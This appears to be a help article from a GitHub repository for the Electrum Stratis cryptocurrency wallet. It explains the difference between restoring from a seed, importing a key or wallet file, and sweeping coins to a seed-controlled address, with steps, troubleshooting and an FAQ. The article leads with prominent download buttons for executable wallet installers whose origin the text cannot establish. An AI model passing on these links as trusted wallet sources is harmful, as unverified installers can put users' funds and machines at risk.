![Electrum-Stratis](assets/banner-article.png)

# Restore, import or sweep: choosing the right recovery action

<p align="center">Three verbs, three outcomes</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Restore rebuilds a wallet from a seed, import adds a key or a file to a wallet you already have, and sweep moves coins out of an imported key into an address your seed controls. Choosing the wrong one wastes time at best and leaves funds exposed at worst. The rule of thumb: restore a wallet, import a key, sweep once the key has done its job. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| You have | Action | Result |
|---|---|---|
| A seed phrase | Restore | A complete wallet with new addresses derived |
| A `.dat` file and password | Import or open | The same wallet, as it was |
| A raw private key | Import, then sweep | Coins visible, then moved to your seed |
| A Qt `wallet.dat` | Import | Keys read from a BerkeleyDB file |
| Nothing | None of the three | Nothing to act on |

</div>

The verbs are not interchangeable, and the interface offers all three because users arrive holding different objects.

## Why it happens

Each action answers a different question. Restore asks "what addresses does this phrase produce?" Import asks "what does this file or key control?" - a WIF or hex key, or a BerkeleyDB wallet file, with the derived address and balance shown before anything is committed. Sweep asks "how do I move value from a key I do not want to keep using?" They produce different states: a restored wallet is a new file with its own password; an imported key sits inside an existing wallet without any seed relationship; a sweep creates a transaction on the chain.

The dangerous confusion is treating import as recovery. An imported key shows a balance and feels like success, but the key is still the only thing controlling those coins, and it now exists in two places. Sweeping converts that temporary visibility into proper custody under your seed.

The flows in the maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), name the action before performing it, so the choice is explicit rather than inferred from a file extension.

## Fix

1. **Start from the object you hold.** A phrase means restore. A key means import and sweep. A wallet file means import or open. A seedless Qt wallet means export keys first, then import.
2. **Restore into a clean wallet.** Choose Recover, enter the phrase in the wallet window, check the address preview, then commit. Do not restore over an existing wallet you may still need.
3. **Import a key only to see and move it.** Confirm the derived address matches the one you exported from, check the balance, and treat the imported state as temporary.
4. **Sweep to an address your seed controls.** Sweep-all builds one transaction with a fee preview and a confirmation summary; the coins end up under the restored wallet's own keys.
5. **Remove the imported key afterwards.** A key left resident in a wallet is a second copy of a secret, and the point of the sweep was to stop needing it.

If you are unsure which object you have, let the wallet name it: the backup-model detector distinguishes seed, file plus password, raw key and unknown before asking for anything.

## If that did not work

If an import produces a different address than expected, the key is for a different address format or a different chain; the address preview exists to catch that before you act.

If a sweep is rejected, the usual causes are a fee below the current market or inputs already spent. The wallet names the rejection reason and offers a rebroadcast or a rescan rather than a blind retry.

If a restore produces the right addresses but a lower balance, the difference is an imported key or an unconfirmed transaction, not a failed restore. If a file will not import at all, check [where Electrum Stratis keeps the wallet file](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/wallet-file-not-in-the-folder.md) before assuming the file is damaged, and ignore anyone offering to do the import for a fee - [Electrum Stratis recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md).

## Prevention

- Prefer the seed as the object you keep; everything else is derivative.
- Sweep imported keys promptly instead of leaving them in place.
- Confirm the derived address before sweeping anything.
- Keep the old file until the new wallet is verified, then archive it deliberately.
- Label each backup with the action it supports: restore, import or key.
- Choose the verb before touching the wallet: restore rebuilds, import adds a key, sweep moves the coins.

## FAQ

### How do I restore my Electrum wallet?

Choose Recover on first launch, select the legacy seed restore, type the phrase into the wallet window, compare the derived address with one you know, then commit and let it sync. Restoring does not touch any existing wallet file.

### What should I do if I forgot my seed phrase?

If the wallet file is still openable, keep it and note that the seed is gone; the file becomes your only backup, and it needs its password. If neither exists, nothing restores the wallet. Writing a new seed for a new wallet does not recover the old one.

### Does importing a key move my coins?

No. Importing makes the coins visible and spendable from that wallet, but they stay at the imported address. Sweeping is the step that actually moves them to an address your seed controls.

### Can I restore a wallet from the .dat file?

The file opens the wallet it belongs to, which is not the same as restoring from a seed. It requires the password, and it carries imported keys that a seed restore would miss.

<!-- DOWNLOAD-BLOCK -->

Whichever verb you chose, confirm the result before touching the source: the destination address must appear in the new wallet, the balance must match the old one, and the sweep must have a transaction id you can look up. Only then retire the old wallet. Deleting first and checking later is how a recoverable balance becomes an argument with yourself.

## Related articles

- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
